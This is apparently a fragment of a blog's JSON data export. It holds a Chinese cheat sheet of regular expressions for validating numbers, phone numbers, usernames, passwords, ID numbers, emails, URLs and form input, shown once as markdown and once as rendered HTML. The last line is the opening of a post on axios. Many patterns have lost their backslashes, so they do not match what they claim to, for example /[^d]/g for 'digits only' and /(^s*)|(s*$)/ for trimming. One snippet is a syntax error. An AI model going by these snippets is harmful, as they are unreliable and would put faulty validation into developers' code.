**/^1[3456789]\\d{9}$/** 或 **/^1\\d{10}$/**\n\n- 常用的用户名、密码验证\n\n|  模式  |  表达式  |\n| - | - |\n|4到16位（字母，数字，下划线，减号）     | **/^[a-zA-Z0-9_-]{4,16}$/**\n|最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符     | **/^.*(?=.{6,})(?=.*\\d)(?=.*[A-Z])(?=.*[a-z])(?=.*[!@#$%^&*? ]).*$/**\n|4到16位（字母，数字，下划线，减号）     | **/^[a-zA-Z0-9_-]{4,16}$/**\n\n\n- 验证身份证号\n```js\nvar reg = /^(^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$)|(^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])((\\d{4})|\\d{3}[Xx])$)$/;\n```\n\n- email地址\n```sh\n# 第一种\n/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/\n# 第二种\n/w+([-+.]w+)*@w+([-.]w+)*.w+([-.]w+)*/\n```\n\n- url地址\n```sh\n# 第一种\n/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/\n# 第二种\n/http://([w-]+.)+[w-]+(/[w- ./?%&=]*)?/\n```\n\n- 匹配双字节字符(包括汉字在内) \n```js\n/[^x00-xff]/\n\n// 应用：计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)\nString.prototype.len=function(){\n  return this.replace([^x00-xff]/g,\"aa\").length;\n}\n```\n\n- 匹配首尾空格的正则               \n```js\n/(^s*)|(s*$)/\n\n// 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：\nString.prototype.trim = function(){\n  return this.replace(/(^s*)|(s*$)/g, \"\");\n}\n```\n\n- 去除字串中重复的字符的javascript程序\n```js\nvar s  = \"abacabefgeeii\";\nvar s1 = s.replace(/(.).*1/g, \"$1\");\nvar re = new RegExp(\"[\"+s1+\"]\", \"g\");\nvar s2 = s.replace(re, \"\");\nalert(s1+s2); // 结果为：abcefgi\n\n// 使用后向引用取出包括重复的字符，再以重复的字符建立第二个表达式，取到不重复的字符，\n// 两者串连。这个方法对于字符顺序有要求的字符串可能不适用。\n```\n\n- 用正则表达式从URL地址中提取文件名的javascript程序\n```js\nvar s = \"http://www.9499.net/page1.html\";\ns = s.replace(/(.*/){0,}([^.]+).*/ig, \"$2\");\nalert(s); // 结果为page1\n```\n\n- 限制表单文本框输入内容\n```js\n// 只能输入中文：\nonkeyup=\"value=value.replace(/[^u4E00-u9FA5]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^u4E00-u9FA5]/g,''))\"\n\n// 只能输入全角字符：\nonkeyup=\"value=value.replace(/[^uFF00-uFFFF]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^uFF00-uFFFF]/g,''))\"\n\n// 只能输入数字：\nonkeyup=\"value=value.replace(/[^d]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"\n\n// 只能输入数字和英文：\nonkeyup=\"value=value.replace(/[W]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"\n```","slug":"0809028_常用正则表达式总结","published":1,"updated":"2018-03-26T12:22:11.909Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvwg002ws4c0uc88rqlc","content":"<ul>\n<li>常用的输入验证</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>表达式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1. 非负整数</td>\n<td><strong>/^\\d+$/</strong></td>\n</tr>\n<tr>\n<td>2. 正整数</td>\n<td><strong>/^[0-9]<em>[1-9][0-9]</em>$/</strong></td>\n</tr>\n<tr>\n<td>3. 非正整数</td>\n<td><strong>/^((-\\d+)&#124;(0+))$/</strong></td>\n</tr>\n<tr>\n<td>4. 负整数</td>\n<td><strong>/^-[0-9]<em>[1-9][0-9]</em>$/</strong></td>\n</tr>\n<tr>\n<td>5. 整数</td>\n<td><strong>/^-?\\d+$/</strong></td>\n</tr>\n<tr>\n<td>6. 非负浮点数</td>\n<td><strong>/^\\d+(.\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>7. 正浮点数</td>\n<td><strong>/^(([0-9]+.[0-9]<em>[1-9][0-9]</em>)&#124;([0-9]<em>[1-9][0-9]</em>.[0-9]+)&#124;([0-9]<em>[1-9][0-9]</em>))$/</strong></td>\n</tr>\n<tr>\n<td>8. 非正浮点数</td>\n<td><strong>/^((-\\d+(.\\d+)?)&#124;(0+(.0+)?))$/</strong></td>\n</tr>\n<tr>\n<td>9. 负浮点数</td>\n<td><strong>/^(-(([0-9]+.[0-9]<em>[1-9][0-9]</em>)&#124;([0-9]<em>[1-9][0-9]</em>.[0-9]+)&#124;([0-9]<em>[1-9][0-9]</em>)))$/</strong></td>\n</tr>\n<tr>\n<td>10. 浮点数</td>\n<td><strong>/^(-?\\d+)(.\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>11. 数字</td>\n<td><strong>/^\\d+(.{1}\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>12. 由26个英文字母组成的字符串</td>\n<td><strong>/^[A-Za-z]+$/</strong></td>\n</tr>\n<tr>\n<td>13. 由26个英文字母的大写组成的字符串</td>\n<td><strong>/^[A-Z]+$/</strong></td>\n</tr>\n<tr>\n<td>14. 由26个英文字母的小写组成的字符串</td>\n<td><strong>/^[a-z]+$/</strong></td>\n</tr>\n<tr>\n<td>15. 由数字和26个英文字母组成的字符串</td>\n<td><strong>/^[A-Za-z0-9]+$/</strong></td>\n</tr>\n<tr>\n<td>16. 由数字、26个英文字母或者下划线组成的字符串</td>\n<td><strong>/^\\w+$/</strong></td>\n</tr>\n<tr>\n<td>17. 匹配所有单字节长度的字符组成的字符串</td>\n<td><strong>/^[\\x00-\\xff]+$/</strong></td>\n</tr>\n<tr>\n<td>18. 匹配所有双字节长度的字符组成的字符串</td>\n<td><strong>/^[^\\x00-\\xff]+$/</strong></td>\n</tr>\n<tr>\n<td>19. 字符串是否含有双字节字</td>\n<td><strong>/[^\\x00-\\xff]+/</strong></td>\n</tr>\n<tr>\n<td>20. 匹配中文字符的正则</td>\n<td><strong>/[u4e00-u9fa5]/</strong></td>\n</tr>\n<tr>\n<td>21. 匹配空行的正则</td>\n<td><strong>/n[s&#124; ]*r/</strong></td>\n</tr>\n<tr>\n<td>22. 匹配HTML标记的正则</td>\n<td><strong>/&lt;(.<em>)&gt;.</em>&#124;&lt;(.*) /&gt;/</strong></td>\n</tr>\n<tr>\n<td>23. 验证文件名由字母，数字，下滑线组成</td>\n<td><strong>/^((\\w+)(.{1})(\\w+))$/</strong></td>\n</tr>\n<tr>\n<td>24. 整数或者小数</td>\n<td><strong>/^[0-9]+.{0,1}[0-9]{0,2}$/</strong></td>\n</tr>\n<tr>\n<td>25. 只能输入数字</td>\n<td><strong>/^[0-9]*$/</strong></td>\n</tr>\n<tr>\n<td>26. 只能输入n位的数字</td>\n<td><strong>/^\\d{n}$/</strong></td>\n</tr>\n<tr>\n<td>27. 只能输入至少n位的数字</td>\n<td><strong>/^\\d{n,}$/</strong></td>\n</tr>\n<tr>\n<td>28. 只能输入m~n位的数字</td>\n<td><strong>/^\\d{m,n}$/</strong></td>\n</tr>\n<tr>\n<td>29. 由数字、26个英文字母或者下划线组成的字符串</td>\n<td><strong>/^\\w+$/</strong></td>\n</tr>\n<tr>\n<td>30. 手机号</td>\n<td><strong>/^1[3456789]\\d{9}$/</strong> 或 <strong>/^1\\d{10}$/</strong></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>常用的用户名、密码验证</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>表达式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>4到16位（字母，数字，下划线，减号）</td>\n<td><strong>/^[a-zA-Z0-9_-]{4,16}$/</strong></td>\n</tr>\n<tr>\n<td>最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符</td>\n<td><strong>/^.<em>(?=.{6,})(?=.</em>\\d)(?=.<em>[A-Z])(?=.</em>[a-z])(?=.<em>[!@#$%^&amp;</em>? ]).*$/</strong></td>\n</tr>\n<tr>\n<td>4到16位（字母，数字，下划线，减号）</td>\n<td><strong>/^[a-zA-Z0-9_-]{4,16}$/</strong></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><p>验证身份证号</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"regexp\">/^(^[1-9]\\d&#123;7&#125;((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d&#123;3&#125;$)|(^[1-9]\\d&#123;5&#125;[1-9]\\d&#123;3&#125;((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])((\\d&#123;4&#125;)|\\d&#123;3&#125;[Xx])$)$/</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>email地址</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一种</span></span><br><span class=\"line\">/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/</span><br><span class=\"line\"><span class=\"comment\"># 第二种</span></span><br><span class=\"line\">/w+([-+.]w+)*@w+([-.]w+)*.w+([-.]w+)*/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>url地址</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一种</span></span><br><span class=\"line\">/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/</span><br><span class=\"line\"><span class=\"comment\"># 第二种</span></span><br><span class=\"line\">/http://([w-]+.)+[w-]+(/[w- ./?%&amp;=]*)?/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>匹配双字节字符(包括汉字在内) </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/[^x00-xff]/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 应用：计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>.prototype.len=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.replace([^x00-xff]/g,<span class=\"string\">\"aa\"</span>).length;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>匹配首尾空格的正则               </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/(^s*)|(s*$)/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>.prototype.trim = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.replace(<span class=\"regexp\">/(^s*)|(s*$)/g</span>, <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>去除字串中重复的字符的javascript程序</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s  = <span class=\"string\">\"abacabefgeeii\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> s1 = s.replace(<span class=\"regexp\">/(.).*1/g</span>, <span class=\"string\">\"$1\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"[\"</span>+s1+<span class=\"string\">\"]\"</span>, <span class=\"string\">\"g\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> s2 = s.replace(re, <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">alert(s1+s2); <span class=\"comment\">// 结果为：abcefgi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用后向引用取出包括重复的字符，再以重复的字符建立第二个表达式，取到不重复的字符，</span></span><br><span class=\"line\"><span class=\"comment\">// 两者串连。这个方法对于字符顺序有要求的字符串可能不适用。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用正则表达式从URL地址中提取文件名的javascript程序</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"http://www.9499.net/page1.html\"</span>;</span><br><span class=\"line\">s = s.replace(<span class=\"regexp\">/(.*/</span>)&#123;<span class=\"number\">0</span>,&#125;([^.]+).*<span class=\"regexp\">/ig, \"$2\");</span></span><br><span class=\"line\"><span class=\"regexp\">alert(s); /</span><span class=\"regexp\">/ 结果为page1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>限制表单文本框输入内容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 只能输入中文：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^u4E00-u9FA5]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^u4E00-u9FA5]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入全角字符：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^uFF00-uFFFF]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^uFF00-uFFFF]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入数字：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^d]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入数字和英文：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[W]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>常用的输入验证</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>表达式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1. 非负整数</td>\n<td><strong>/^\\d+$/</strong></td>\n</tr>\n<tr>\n<td>2. 正整数</td>\n<td><strong>/^[0-9]<em>[1-9][0-9]</em>$/</strong></td>\n</tr>\n<tr>\n<td>3. 非正整数</td>\n<td><strong>/^((-\\d+)&#124;(0+))$/</strong></td>\n</tr>\n<tr>\n<td>4. 负整数</td>\n<td><strong>/^-[0-9]<em>[1-9][0-9]</em>$/</strong></td>\n</tr>\n<tr>\n<td>5. 整数</td>\n<td><strong>/^-?\\d+$/</strong></td>\n</tr>\n<tr>\n<td>6. 非负浮点数</td>\n<td><strong>/^\\d+(.\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>7. 正浮点数</td>\n<td><strong>/^(([0-9]+.[0-9]<em>[1-9][0-9]</em>)&#124;([0-9]<em>[1-9][0-9]</em>.[0-9]+)&#124;([0-9]<em>[1-9][0-9]</em>))$/</strong></td>\n</tr>\n<tr>\n<td>8. 非正浮点数</td>\n<td><strong>/^((-\\d+(.\\d+)?)&#124;(0+(.0+)?))$/</strong></td>\n</tr>\n<tr>\n<td>9. 负浮点数</td>\n<td><strong>/^(-(([0-9]+.[0-9]<em>[1-9][0-9]</em>)&#124;([0-9]<em>[1-9][0-9]</em>.[0-9]+)&#124;([0-9]<em>[1-9][0-9]</em>)))$/</strong></td>\n</tr>\n<tr>\n<td>10. 浮点数</td>\n<td><strong>/^(-?\\d+)(.\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>11. 数字</td>\n<td><strong>/^\\d+(.{1}\\d+)?$/</strong></td>\n</tr>\n<tr>\n<td>12. 由26个英文字母组成的字符串</td>\n<td><strong>/^[A-Za-z]+$/</strong></td>\n</tr>\n<tr>\n<td>13. 由26个英文字母的大写组成的字符串</td>\n<td><strong>/^[A-Z]+$/</strong></td>\n</tr>\n<tr>\n<td>14. 由26个英文字母的小写组成的字符串</td>\n<td><strong>/^[a-z]+$/</strong></td>\n</tr>\n<tr>\n<td>15. 由数字和26个英文字母组成的字符串</td>\n<td><strong>/^[A-Za-z0-9]+$/</strong></td>\n</tr>\n<tr>\n<td>16. 由数字、26个英文字母或者下划线组成的字符串</td>\n<td><strong>/^\\w+$/</strong></td>\n</tr>\n<tr>\n<td>17. 匹配所有单字节长度的字符组成的字符串</td>\n<td><strong>/^[\\x00-\\xff]+$/</strong></td>\n</tr>\n<tr>\n<td>18. 匹配所有双字节长度的字符组成的字符串</td>\n<td><strong>/^[^\\x00-\\xff]+$/</strong></td>\n</tr>\n<tr>\n<td>19. 字符串是否含有双字节字</td>\n<td><strong>/[^\\x00-\\xff]+/</strong></td>\n</tr>\n<tr>\n<td>20. 匹配中文字符的正则</td>\n<td><strong>/[u4e00-u9fa5]/</strong></td>\n</tr>\n<tr>\n<td>21. 匹配空行的正则</td>\n<td><strong>/n[s&#124; ]*r/</strong></td>\n</tr>\n<tr>\n<td>22. 匹配HTML标记的正则</td>\n<td><strong>/&lt;(.<em>)&gt;.</em>&#124;&lt;(.*) /&gt;/</strong></td>\n</tr>\n<tr>\n<td>23. 验证文件名由字母，数字，下滑线组成</td>\n<td><strong>/^((\\w+)(.{1})(\\w+))$/</strong></td>\n</tr>\n<tr>\n<td>24. 整数或者小数</td>\n<td><strong>/^[0-9]+.{0,1}[0-9]{0,2}$/</strong></td>\n</tr>\n<tr>\n<td>25. 只能输入数字</td>\n<td><strong>/^[0-9]*$/</strong></td>\n</tr>\n<tr>\n<td>26. 只能输入n位的数字</td>\n<td><strong>/^\\d{n}$/</strong></td>\n</tr>\n<tr>\n<td>27. 只能输入至少n位的数字</td>\n<td><strong>/^\\d{n,}$/</strong></td>\n</tr>\n<tr>\n<td>28. 只能输入m~n位的数字</td>\n<td><strong>/^\\d{m,n}$/</strong></td>\n</tr>\n<tr>\n<td>29. 由数字、26个英文字母或者下划线组成的字符串</td>\n<td><strong>/^\\w+$/</strong></td>\n</tr>\n<tr>\n<td>30. 手机号</td>\n<td><strong>/^1[3456789]\\d{9}$/</strong> 或 <strong>/^1\\d{10}$/</strong></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>常用的用户名、密码验证</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>表达式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>4到16位（字母，数字，下划线，减号）</td>\n<td><strong>/^[a-zA-Z0-9_-]{4,16}$/</strong></td>\n</tr>\n<tr>\n<td>最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符</td>\n<td><strong>/^.<em>(?=.{6,})(?=.</em>\\d)(?=.<em>[A-Z])(?=.</em>[a-z])(?=.<em>[!@#$%^&amp;</em>? ]).*$/</strong></td>\n</tr>\n<tr>\n<td>4到16位（字母，数字，下划线，减号）</td>\n<td><strong>/^[a-zA-Z0-9_-]{4,16}$/</strong></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><p>验证身份证号</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"regexp\">/^(^[1-9]\\d&#123;7&#125;((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d&#123;3&#125;$)|(^[1-9]\\d&#123;5&#125;[1-9]\\d&#123;3&#125;((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])((\\d&#123;4&#125;)|\\d&#123;3&#125;[Xx])$)$/</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>email地址</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一种</span></span><br><span class=\"line\">/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/</span><br><span class=\"line\"><span class=\"comment\"># 第二种</span></span><br><span class=\"line\">/w+([-+.]w+)*@w+([-.]w+)*.w+([-.]w+)*/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>url地址</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一种</span></span><br><span class=\"line\">/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/</span><br><span class=\"line\"><span class=\"comment\"># 第二种</span></span><br><span class=\"line\">/http://([w-]+.)+[w-]+(/[w- ./?%&amp;=]*)?/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>匹配双字节字符(包括汉字在内) </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/[^x00-xff]/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 应用：计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>.prototype.len=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.replace([^x00-xff]/g,<span class=\"string\">\"aa\"</span>).length;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>匹配首尾空格的正则               </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/(^s*)|(s*$)/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>.prototype.trim = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.replace(<span class=\"regexp\">/(^s*)|(s*$)/g</span>, <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>去除字串中重复的字符的javascript程序</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s  = <span class=\"string\">\"abacabefgeeii\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> s1 = s.replace(<span class=\"regexp\">/(.).*1/g</span>, <span class=\"string\">\"$1\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> re = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"[\"</span>+s1+<span class=\"string\">\"]\"</span>, <span class=\"string\">\"g\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> s2 = s.replace(re, <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">alert(s1+s2); <span class=\"comment\">// 结果为：abcefgi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用后向引用取出包括重复的字符，再以重复的字符建立第二个表达式，取到不重复的字符，</span></span><br><span class=\"line\"><span class=\"comment\">// 两者串连。这个方法对于字符顺序有要求的字符串可能不适用。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用正则表达式从URL地址中提取文件名的javascript程序</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"http://www.9499.net/page1.html\"</span>;</span><br><span class=\"line\">s = s.replace(<span class=\"regexp\">/(.*/</span>)&#123;<span class=\"number\">0</span>,&#125;([^.]+).*<span class=\"regexp\">/ig, \"$2\");</span></span><br><span class=\"line\"><span class=\"regexp\">alert(s); /</span><span class=\"regexp\">/ 结果为page1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>限制表单文本框输入内容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 只能输入中文：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^u4E00-u9FA5]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^u4E00-u9FA5]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入全角字符：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^uFF00-uFFFF]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^uFF00-uFFFF]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入数字：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[^d]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 只能输入数字和英文：</span></span><br><span class=\"line\">onkeyup=<span class=\"string\">\"value=value.replace(/[W]/g,'')\"</span> </span><br><span class=\"line\">onbeforepaste=<span class=\"string\">\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"id":"0809017","title":"axios 简易上手","date":"2017-12-23T02:23:18.000Z","_content":"\n> Promise based HTTP client for the browser and node.js.（`axios` 是一个基于 `Promise` 的 `HTTP` 库，可以用在 `浏览器` 和 `node.js` 中。）\n\n<a href=\"#install\">1. 安装</a>\n<a href=\"#example\">2. 官网示例</a>\n<a href=\"#apiIntro\">3. API 